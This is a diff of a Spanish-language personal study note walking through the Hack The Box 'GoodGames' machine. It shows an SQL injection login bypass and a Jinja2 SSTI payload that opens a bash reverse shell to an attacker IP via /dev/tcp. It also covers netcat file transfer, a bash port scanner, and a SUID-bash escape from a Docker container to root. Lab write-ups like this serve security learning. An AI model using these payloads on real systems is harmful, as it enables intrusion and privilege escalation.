@@ -1,6 +1,5 @@
-# 🎮 GoodGames - HTB Writeup
 
-## 🔍 Reconocimiento
+## 🔍 Reconocimiento con [[NMAP]]
 
 Escaneamos todos los puertos abiertos:
 
@@ -20,11 +19,11 @@ nmap -sCV -p80 10.10.11.130 -oN target
 
 ---
 
-## 🧪 SQL Injection para Login Bypass
+## 🧪 [[SQLI TERMINAR]]
 
 1. Nos creamos una cuenta y nos deslogeamos.
-2. Interceptamos la petición de login con *Caido*.
-3. En el campo del email usamos:
+2. Interceptamos la petición de login con *Caido*. Poniendo cualqueir mail valido con "@", por que si no no vamos a llegar a mandar la peticion y no la va a poder interceptar caido, ya que se hace una verificacion a nivel de navegador del @
+3. En el campo del email vamos a hacer la inyeccion con:
     ```
     admin' or 1=1-- -
     ```
@@ -60,7 +59,7 @@ Debemos agregar el dominio en el archivo `/etc/hosts`:
 
 ![[Goodgames6.png]]
 
-Una vez dentro, tenemos un **nuevo panel de login** el cual vamos a interceptar nuevamente con *Caido*.
+Una vez dentro, tenemos un **nuevo panel de login** en el cual no nos deja hacer ningun tipo de inyeccion
 
 ![[Goodgames7.png]]
 
@@ -68,7 +67,7 @@ Una vez dentro, tenemos un **nuevo panel de login** el cual vamos a interceptar 
 
 ## 🐍 Script de Dump de Datos
 
-En el nuevo login vulnerable a SQLi, vamos a usar un script en Python para dumpear los datos de las bases de datos:
+En el campo de login en el cual hicimos la inyeccion previamente, con este script vamos a empezar a dumpear todos los datos, para hacernos con el usuario y la contraseña
 
 ```python
 #!/usr/bin/env python3
@@ -143,34 +142,30 @@ Resultado: superadministrator
 
 ---
 
-# SSTI
+# [[Apuntes Directo/3)Intrusion a maquinas/Server-Side Template Injection (SSTI)|Server-Side Template Injection (SSTI)]]
+![[Goodgames19.png]]
 Como funciono el {{7*\7}}  y nos dio 49, pensamos que es un SSTI      | esta capado con \ 
 
 ![[Goodgames13.png]]
 	Probamos este payload, por que como en wapallyzer vemos que esta corriendo python3, asumimos que se esta puyede estar usando jinja2
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.16.6/443 0>&1"').read() }}        | El comando lo sacamos de este [articulo](https://chatgpt.com/c/68220f4f-2fec-8000-acb9-3f2f26690d56)
-	Mientras nos ponemos en escucha por el puerto 443 con
-	```bash
-	nc -nlvp 443
-	```
+```
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.16.6/443 0>&1"').read() }}
+```
+
+Mientras nos ponemos en escucha por el puerto 443 en nuestra maquina con el comando
+`nc -nlvp 443`
 # Accedemos a la maquina y vemos la primera flag
 ![[Goodgames14.png]]
 ![[Goodgames15.png]]
 Tenemos que tener en cuenta el home de augustus, que puede ser relevante en un futuro
 
-# Tratamiento de la tty
-```bash
-scrip /dev/null -c bash
-CTRL+ Z
-stty raw -echo;fg
-reset xterm
-export SHELL=bash
-export TERM=xterm
-stty rows 37 columns 174
-```
+-------
+# [[Apuntes Directo/Herramientas-Comandos/Tratamiento de la TTY|Tratamiento de la TTY]]
 
-# Salir del contenedor a la maquina victima
-Tenemos la sospecha de que estamos en un contenedor, por el nombre despues de @: root@3a453ab39d3d
+----
+
+# [[Salir del contenedor docker TERMINAR]]
+Tenemos la sospecha de que estamos en un contenedor, por el nombre despues de root@3a453ab39d3d
 Confirmamos que estamos en un contenedor usando `hostname -I` somos la ip 172.19.0.2
 ![[Goodgames16.png]]
 
@@ -179,12 +174,64 @@ Usamos el comando `mount | grep augustus` y nos dice que la particion del disco 
 Mandamos un ping a 172.19.0.1, y nos responde
 ![[Goodgames18.png]]
 
+Nos vamos a mandar el archivo portScanner.sh desde nuestra maquina a la maquina victima
+```shell
+Nuestra maquina: nc -nlvp 443 < portScanner.sh
+Maquina victima: cat < /dev/tcp/10.10.16.3/443 > portScanner.sh
+Y despues despues desde la maquina victima, darle permiso de ejecucion con chmod +x portScanner.sh
+
+```
+```python
+#!/bin/bash
+
+function ctrl_c(){
+    echo "[!] Saliendo.."
+    exit 1
+}
+
+trap ctrl_c INT
+
+for i in $(seq 1 65535); do
+    timeout 1 bash -c "echo '' > /dev/tcp/172.19.0.1/$i" 2>/dev/null && echo "[!]Puerto abierto: $i" &
+
+done
+```
+
+Nos da como resultado al ejecutar el escaneo de puertos, que tiene el 22 y el 80 abiertos
+![[Goodgames20.png]]
+
+Como vemos que es el puerto 22 de SSH abierto, vamos a intentar conectarnos con las credenciales de augustus que tenemos
+```
+ssh augustus@172.19.0.1
+Contraseña: superadministrator
+```
+
+![[Goodgames21.png]]
+
+
+*En la maquina de augustus:*
+	Usamos el comando `cp /bin/bash .` en el directorio /home/augustus
+*Desde el contendor:*
+	 `chown root:root bash`
+	 `chmod 4755 bash`
+Ahora volvemos a entrar a la maquina de augustus, con ssh, y ejecutamos la bash con privilegios, ya seriamos root, asi que despues cateamos el archivo con la flag
+```shell
+./bash -p
+cat /root/root.txt
+```
+![[Goodgames22.png]]
+
+
+
+
+
+
 ## 📝 Notas
 
 - Intentar saltar el login mediante una inyección SQL como por ejemplo admin' or 1 = 1 -- -
    La vulnerabilidad permite acceder como el primer usuario de la base de datos, usualmente `admin`.
 
-## Comando root -n
+## Comando route -n
 Nos sirve para encontrar la ip de la maquina host, estando dentro del contenedor, 
 
 `route -n`
@@ -193,38 +240,34 @@ Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
 0.0.0.0         172.19.0.1      0.0.0.0         UG    0      0        0 eth0
 172.19.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth0
 
-|   |   |
-|---|---|
-|`Destination`|`0.0.0.0` → Esta es la **ruta por defecto**: cualquier tráfico que no coincida con otra ruta irá por esta.|
 
-|   |   |
-|---|---|
-|`Gateway`|`172.19.0.1` → La **puerta de enlace** o **router** al que se enviará ese tráfico.|
+| `Gateway` | `172.19.0.1` → La **puerta de enlace** o **router** al que se enviará ese tráfico. |     |
+| --------- | ---------------------------------------------------------------------------------- | --- |
 
-|           |                                                                                                                                              |
-| --------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
+
 | `Genmask` | `0.0.0.0` → Máscara para una red "catch-all" (todas las IPs).        dependiendo el contexto, 0.0.0.0 vale todas las ips, pero en general si |
+| --------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
 
-|   |   |
-|---|---|
-|`Flags`|`UG` → `U` indica que la interfaz está **activa (up)**, y `G` que usa una **gateway**.|
 
-|   |   |
-|---|---|
-|`Metric`|`0` → Prioridad de la ruta (más bajo = más prioridad).|
+| `Flags` | `UG` → `U` indica que la interfaz está **activa (up)**, y `G` que usa una **gateway**. |
+| ------- | -------------------------------------------------------------------------------------- |
 
-|   |   |
-|---|---|
-|`Ref`|`0` → No se usa casi nunca (referencias).|
+| `Metric` | `0` → Prioridad de la ruta (más bajo = más prioridad). |
+| -------- | ------------------------------------------------------ |
 
-|   |   |
-|---|---|
-|`Use`|`0` → Veces que se usó esta ruta (desde que se levantó la interfaz).|
 
-|         |                                                      |
-| ------- | ---------------------------------------------------- |
+| `Ref` | `0` → No se usa casi nunca (referencias). |
+| ----- | ----------------------------------------- |
+
+
+| `Use` | `0` → Veces que se usó esta ruta (desde que se levantó la interfaz). |
+| ----- | -------------------------------------------------------------------- |
+
 | `Iface` | `eth0` → Se envía por la **interfaz de red `eth0`**. |
-|         |                                                      |
+| ------- | ---------------------------------------------------- |
+
+
+
 ### Server-Side Template Injection (SSTI)
 El **Server-Side Template Injection** (**SSTI**) es una vulnerabilidad de seguridad en la que un atacante puede inyectar código malicioso en una **plantilla** de servidor.
 Esta vulnerabilidad, normalmente se prueba poniendo {{7\*7}} (esta capado con \) y si responde 49 lo mas probable es que se de esta vulnerabilidad 
@@ -242,6 +285,9 @@ Probamos este payload, por que como en wapallyzer vemos que esta corriendo pytho
 	**`relatime`**: optimiza las escrituras al disco actualizando los tiempos de acceso de forma más eficiente.
 	**`errors=remount-ro`**: si hay errores, el sistema monta la partición como de solo lectura (para evitar daños).
 
+
+## &&
+En bash significa que va a ejecutar el siguiente comando solo si el anterior fue exitoso
 
 
 ---
